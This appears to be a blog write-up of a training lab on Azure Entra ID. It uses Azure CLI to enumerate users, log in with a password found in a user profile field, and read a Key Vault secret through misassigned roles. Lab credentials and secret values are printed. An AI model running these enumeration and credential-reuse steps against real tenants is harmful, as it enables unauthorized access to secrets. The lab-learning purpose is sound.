---
title: "Hardening Azure: Identifying and Mitigating Entra ID Security Gaps"
seoTitle: "Azure Cloud Services Overview"
seoDescription: "Discover how to identify and mitigate security gaps in Microsoft Entra ID, enhancing your Azure infrastructure protection strategies"
datePublished: Sun Feb 16 2025 13:10:29 GMT+0000 (Coordinated Universal Time)
cuid: cm77n9m5m000c09l5brxxhmjk
slug: azure
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1739711310102/9c34cad4-4858-4759-97c1-269bde3a6767.png
tags: cloud, azure, cybersecurity, pentesting, microsoft-azure, iam, ethicalhacking, azure-security, cloud-security, keyvault, redteaming, entra-id

---

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739697673469/5c68c7c2-bd82-4ecf-b686-8d3ba752b532.png align="center")

Azure is a complete Content Security Provider (CSP) with over 200 services to meet different organizational needs. These services include Identity Management, data handling, computing, analytics, storage, networking, and more. With Azure, organizations can easily build, deploy, and manage their infrastructure. It can also improve current systems or create new applications as business needs change. This wide range of services helps organizations innovate and grow their tech capabilities, keeping them competitive in a fast-changing digital world. Whether it's improving security, optimizing data processing, or scaling applications, Azure provides the tools and resources needed to support these goals.

## Azure Key Vault

Azure Key Vault is a strong service from Microsoft Azure that lets users safely store and manage important information, known as secrets. These secrets can include things like API keys, digital certificates, passwords, cryptographic keys, and other private data that need protection. By using Azure Key Vault, organizations can keep their sensitive data in a very secure place, using advanced encryption to prevent unauthorized access. The service works well with other Azure services, making it easy to manage secrets across different applications and systems. Azure Key Vault also offers features like access control policies, audit logs, and automatic key rotation, helping organizations follow industry standards and best practices for data security. This makes Azure Key Vault a key tool for businesses wanting to improve their security and protect their valuable digital assets.

## Entra ID (Formerly known as Azure Active Directory)

Entra ID, previously called Azure Active Directory, is a complete identity and access management (IAM) service from Microsoft. It is important for managing and securing user identities and their access to different resources in a company. Entra ID works as a central place that keeps and checks the information needed to decide if a user or application has the right permissions to access something like a file, application, or network service.

The service offers many features to improve security and make access management easier. These features include single sign-on (SSO), which lets users access multiple apps with one login, making it easier and reducing the need for many passwords. Entra ID also supports multi-factor authentication (MFA), adding more security by asking users for extra verification, like a code sent to their phone, before they can access something.

Furthermore, Entra ID provides strong tools for managing user roles and permissions. This allows administrators to set and enforce access rules based on specific criteria like user roles, departments, or locations. This detailed control ensures users only access the resources they need, reducing the risk of unauthorized access.

Besides these security features, Entra ID works smoothly with other Microsoft services and third-party apps, offering a single platform to manage identities in different settings. This integration helps with easy collaboration and productivity while keeping security high and meeting industry standards.

Overall, Entra ID is a key service for organizations that want to improve how they manage identities and access, protect important information, and make sure users can safely access the resources they need to do their jobs well.

## Assumed Breach Scenario

The Assumed Breach scenario is a specialized type of penetration testing setup designed to simulate a situation where an attacker has already gained initial access or a foothold within an organization's internal network. This approach is used to mimic real-world conditions where a security breach has occurred, allowing security teams to evaluate the potential impact and response strategies.

In this setup, the focus is on understanding the extent of damage an attacker could inflict once they have infiltrated the network. It involves exploring all possible attack paths and lateral movements that could originate from the initial point of intrusion. By doing so, organizations can identify vulnerabilities in their security architecture, assess the effectiveness of their existing security measures, and develop strategies to contain and mitigate the impact of such breaches.

The Assumed Breach scenario also helps in testing the organization's incident response capabilities, ensuring that the security team is prepared to detect, respond to, and recover from an actual breach. This comprehensive assessment provides valuable insights into the organization's security posture and highlights areas that require improvement to prevent unauthorized access and protect sensitive data.

> Lab ID: 02166240
> 
> Username: [usr-02166240@aoc2024.onmicrosoft.com](mailto:usr-02166240@aoc2024.onmicrosoft.com)
> 
> Password: iJr%7z2BU?kB6?4@

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739706435319/e109bf91-f787-435e-b2da-1701ff8046eb.png align="center")

## Azure Cloud Shell

Azure Cloud Shell is a flexible, web-based command-line tool for developers and IT professionals to manage Azure resources. It combines Bash and PowerShell, letting users run scripts, manage Azure services, and execute commands straight from their browser. This means there's no need to install anything on your computer, making it a handy choice for quick access to Azure tools.

Cloud Shell has many built-in tools and ready-to-use environments, like Azure CLI, Azure PowerShell, and other popular development tools. This setup makes it easy and efficient for users to manage and automate cloud tasks. With these tools, users can handle their Azure resources effectively, whether they're deploying apps, setting up services, or automating regular tasks.

Moreover, Azure Cloud Shell lets users save their scripts and files across sessions, thanks to its persistent storage. This boosts productivity because users can continue their work without needing to re-upload files or reset settings. Overall, Azure Cloud Shell offers a strong and easy-to-use platform for managing cloud resources, making it simple to handle Azure tasks from almost anywhere with internet access.

## **Azure CLI**

Azure Command-Line Interface, or Azure CLI, is a command-line tool for managing and configuring Azure resources.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739707759152/a113c176-7a93-4898-9d56-0ef90977bff3.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739707862505/55d8ac53-b982-4aed-a67f-b2d6420bc981.png align="center")

Select Bash, since we will be executing Azure CLI commands.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739707912992/38868f28-3d0c-40f6-a025-d27a39c2f9d9.png align="center")

To get started, select `No storage account required` and choose `Az-Subs-AoC` for the subscription.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739707979416/b96e06dc-0600-45fa-88df-71280fa10de3.png align="center")

At this point, we are ready to execute Azure CLI commands in the Azure Cloud Shell.

You can confirm that the credentials worked if the succeeding output renders the authenticated user details.

```bash
az ad signed-in-user show
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739708081579/01d69380-67fd-413b-b22c-077edaa72f6c.png align="center")

## Going Down the Azure Rabbit Hole

### **Entra ID Enumeration**

Using the current account, let's start by listing all the users in the tenant. 

```bash
az ad user list
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739708159389/4810cee8-6bdb-4093-8494-debff9e3399a.png align="center")

```bash
[
  {
    "businessPhones": [],
    "displayName": "breakglass",
    "givenName": null,
    "id": "d6c5bb7b-36a2-4706-ad5f-dd5a73e5dfd8",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "breakglass@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wiz",
    "givenName": null,
    "id": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "oz_thmtraininglabs.onmicrosoft.com#EXT#@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "usr-02161585",
    "givenName": null,
    "id": "0eded13b-63ab-46ed-96a0-da40daaad9a5",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "usr-02161585@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "weyland",
    "givenName": null,
    "id": "bbbe3752-0ce4-476f-b52f-e2aef17f3183",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wayland@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-alphaware",
    "givenName": null,
    "id": "d197bfbd-adaf-4e54-9ac1-62b2a9568f91",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-alphaware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-firmware",
    "givenName": null,
    "id": "1f80a74b-4abc-4f93-b065-965ea5c826c8",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-firmware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-freeware",
    "givenName": null,
    "id": "47f6013e-9533-49f5-a779-615721145e50",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-freeware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-hardware",
    "givenName": null,
    "id": "ac459a56-09cf-440a-be46-2006b36a68e1",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-hardware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-mayor_malware",
    "givenName": null,
    "id": "4d29c472-f2f6-4e18-8a37-dcd2e2040489",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-mayor_malware@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "wvusr-mcskidy",
    "givenName": null,
    "id": "33845c09-f7ad-45eb-ad24-c05cc1e39bda",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-mcskidy@aoc2024.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "yutani",
    "givenName": null,
    "id": "86e14415-abac-486d-b49a-4825bcd3a13e",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "yutani@aoc2024.onmicrosoft.com"
  }
]
```

The Azure CLI typically uses the following command syntax: `az GROUP SUBGROUP ACTION OPTIONAL_PARAMETERS`. Given this, the command above can be broken down into:

* Target group or service: `ad` (Azure AD or Entra ID)
    
* Target subgroup: `user` (Azure AD users)
    
* Action: `list`
    

> To see the available commands, you may execute `az -h` or `az GROUP -h`.

While going through the user list we can see that the user `wvusr-backupware` has it’s password stored in the `”officeLocation”` field.

```bash
{
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  },
```

This could be the first step taken by the intruder to gain further access inside the tenant. Let’s now continue with the initial recon of users and groups.

```bash
az ad group list
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739708858478/5ecbcea6-33e7-4abb-b9f2-c09393336144.png align="center")

```bash
[
  {
    "classification": null,
    "createdDateTime": "2024-10-13T23:10:55Z",
    "creationOptions": [],
    "deletedDateTime": null,
    "description": "Group for recovering Wareville's secrets",
    "displayName": "Secret Recovery Group",
    "expirationDateTime": null,
    "groupTypes": [],
    "id": "7d96660a-02e1-4112-9515-1762d0cb66b7",
    "isAssignableToRole": null,
    "mail": null,
    "mailEnabled": false,
    "mailNickname": "f315e3ef-c",
    "membershipRule": null,
    "membershipRuleProcessingState": null,
    "onPremisesDomainName": null,
    "onPremisesLastSyncDateTime": null,
    "onPremisesNetBiosName": null,
    "onPremisesProvisioningErrors": [],
    "onPremisesSamAccountName": null,
    "onPremisesSecurityIdentifier": null,
    "onPremisesSyncEnabled": null,
    "preferredDataLocation": null,
    "preferredLanguage": null,
    "proxyAddresses": [],
    "renewedDateTime": "2024-10-13T23:10:55Z",
    "resourceBehaviorOptions": [],
    "resourceProvisioningOptions": [],
    "securityEnabled": true,
    "securityIdentifier": "S-1-12-1-2107008522-1091699425-1645680021-3076967376",
    "serviceProvisioningErrors": [],
    "theme": null,
    "uniqueName": null,
    "visibility": "Private"
  }
]
```

We can see there's a group named `Secret Recovery Group`. This group is interesting because of its description `Group for recovering Wareville's secrets`, so let's explore further and list the members of this group.

```bash
az ad group member list --group "Secret Recovery Group"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739709175618/4c1690db-1795-4ce8-a2cd-15174caf87fb.png align="center")

```bash
[
  {
    "@odata.type": "#microsoft.graph.user",
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  }
]
```

From the previous output, things are becoming clearer. All the earlier commands seem to lead us to the `wvusr-backupware` account. This account appears to be central to what we are investigating. Since we have found possible credentials for this account, our next step is to switch to a different user. We need to clear the current Azure CLI session to log out completely. After logging out, we can log in again using the new account credentials we found. This will let us explore more and understand the activities and permissions linked to the `wvusr-backupware` account.

```bash
az account clear
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739709305828/9fd83f24-ffbe-4d4f-89ca-9164795431ee.png align="center")

```bash
az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R3c0v3r_s3cr3ts!
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739709432119/a8fbaf15-92e5-4304-a01d-30c637167207.png align="center")

```bash
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "id": "ddd3338d-bc5a-416d-8247-1db1f5b5ff43",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Az-Subs-AoC",
    "state": "Enabled",
    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
    "tenantDisplayName": "AoC 2024",
    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "user": {
      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
      "type": "user"
    }
  },
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "id": "3e480a8d-0097-42ec-9c56-60d97ceeb66d",
    "isDefault": false,
    "managedByTenants": [],
    "name": "Subscription 1",
    "state": "Disabled",
    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
    "tenantDisplayName": "AoC 2024",
    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
    "user": {
      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
      "type": "user"
    }
  }
]
```

### **Azure Role Assignments**

Since the `wvusr-backupware` account belongs to an interesting group, our first step should be to see whether sensitive or privileged roles are assigned to the group. let's have a quick run-through of Azure Role Assignments.

**Azure Role Assignments** define the resources that each user or group can access. When a new user is created via Entra ID, it cannot access any resource by default due to a lack of role. To grant access, an administrator must assign a **role** to let users view or manage a specific resource. The privilege level configured in a role ranges from read-only to full-control. Additionally, **group members can inherit a role** when assigned to a group.

Returning to the Azure enumeration, let's see if a role is assigned to the Secret Recovery Group. We will be using the `--all` option to list all roles within the Azure subscription, and we will be using the `--assignee` option with the group's ID to render only the ones related to our target group.

```bash
az role assignment list --assignee 7d96660a-02e1-4112-9515-1762d0cb66b7 --all
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739709910416/6c6fdfa7-0c3c-4046-8762-878058318c95.png align="center")

```bash
[
  {
    "condition": null,
    "conditionVersion": null,
    "createdBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "createdOn": "2024-10-14T20:25:32.172518+00:00",
    "delegatedManagedIdentityResourceId": null,
    "description": null,
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets/providers/Microsoft.Authorization/roleAssignments/3038142a-80c7-4bf1-b7c2-0939b906316d",
    "name": "3038142a-80c7-4bf1-b7c2-0939b906316d",
    "principalId": "7d96660a-02e1-4112-9515-1762d0cb66b7",
    "principalName": "Secret Recovery Group",
    "principalType": "Group",
    "resourceGroup": "rg-aoc-akv",
    "roleDefinitionId": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/providers/Microsoft.Authorization/roleDefinitions/21090545-7ca7-4776-b22c-e363652d74d2",
    "roleDefinitionName": "Key Vault Reader",
    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "type": "Microsoft.Authorization/roleAssignments",
    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "updatedOn": "2024-10-14T20:25:32.172518+00:00"
  },
  {
    "condition": null,
    "conditionVersion": null,
    "createdBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "createdOn": "2024-10-14T20:26:53.771014+00:00",
    "delegatedManagedIdentityResourceId": null,
    "description": null,
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets/providers/Microsoft.Authorization/roleAssignments/d2edb9d3-620b-45a0-af60-128b5153a00a",
    "name": "d2edb9d3-620b-45a0-af60-128b5153a00a",
    "principalId": "7d96660a-02e1-4112-9515-1762d0cb66b7",
    "principalName": "Secret Recovery Group",
    "principalType": "Group",
    "resourceGroup": "rg-aoc-akv",
    "roleDefinitionId": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6",
    "roleDefinitionName": "Key Vault Secrets User",
    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "type": "Microsoft.Authorization/roleAssignments",
    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
    "updatedOn": "2024-10-14T20:26:53.771014+00:00"
  }
]
```

The output seems slightly overwhelming, so let's break it down.

* First, it can be seen that there are two entries in the output, which means two roles are assigned to the group.
    
* Based on the `roleDefinitionName` field, the two roles are `Key Vault Reader` and `Key Vault Secrets User`.
    
* Both entries have the same scope value, pointing to a Microsoft Key Vault resource, specifically on the `warevillesecrets` vault.
    

Here's the definition of the roles based on the [Microsoft documentation](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles):

| **Role** | **Microsoft Definition** | **Explanation** |
| --- | --- | --- |
| Key Vault Reader | Read metadata of key vaults and its certificates, keys, and secrets. | This role allows you to read metadata of key vaults and its certificates, keys, and secrets. Cannot read sensitive values such as secret contents or key material. |
| Key Vault Secrets User | Read secret contents. Only works for key vaults that use the 'Azure role-based access control' permission model. | This special role allows you to read the contents of a Key Vault Secret. |

After reviewing both roles, we can conclude that this setup allowed the attacker to access the sensitive data they were meant to protect.

### Azure Key Vault

Let's now check if the current account, `wvusr-backupware`, can access the sensitive data. We'll list the key vaults that are accessible.

```bash
az keyvault list
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739710262773/7e93d42c-0375-4e68-82ad-267a575f2e92.png align="center")

```bash
[
  {
    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "location": "eastus",
    "name": "warevillesecrets",
    "resourceGroup": "rg-aoc-akv",
    "tags": {},
    "type": "Microsoft.KeyVault/vaults"
  }
]
```

The output above confirms the key vault found from the role assignments is named `warevillesecrets`. Now, let's check if any secrets are stored in this key vault.

```bash
az keyvault secret list --vault-name warevillesecrets
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739710381309/622b7d82-dfc0-4bd1-9ac8-d1cd3fe87515.png align="center")

```bash
[
  {
    "attributes": {
      "created": "2024-10-14T20:22:20+00:00",
      "enabled": true,
      "expires": null,
      "notBefore": null,
      "recoverableDays": 90,
      "recoveryLevel": "Recoverable+Purgeable",
      "updated": "2024-10-14T20:22:20+00:00"
    },
    "contentType": null,
    "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024",
    "managed": null,
    "name": "aoc2024",
    "tags": {}
  }
]
```

After running the two previous commands, we confirmed that the **Reader** role lets us see the key vault metadata, including the list of key vaults and secrets. Now, the last thing to check is whether the current user can access the contents of the discovered secret with the **Key Vault Secrets User** role.

```bash
az keyvault secret show --vault-name warevillesecrets --name aoc2024
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739710537705/396d52b8-46bd-4487-9889-b5f517037f34.png align="center")

```bash
{
  "attributes": {
    "created": "2024-10-14T20:22:20+00:00",
    "enabled": true,
    "expires": null,
    "notBefore": null,
    "recoverableDays": 90,
    "recoveryLevel": "Recoverable+Purgeable",
    "updated": "2024-10-14T20:22:20+00:00"
  },
  "contentType": null,
  "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024/7f6bf431a6a94165bbead372bca28ab4",
  "kid": null,
  "managed": null,
  "name": "aoc2024",
  "tags": {},
  "value": "WhereIsMyMind1999"
}
```

Bingo! We were able to find the secret content stored in the vault: `WhereIsMyMind1999`. This confirms that a regular user could escalate their access to the secrets.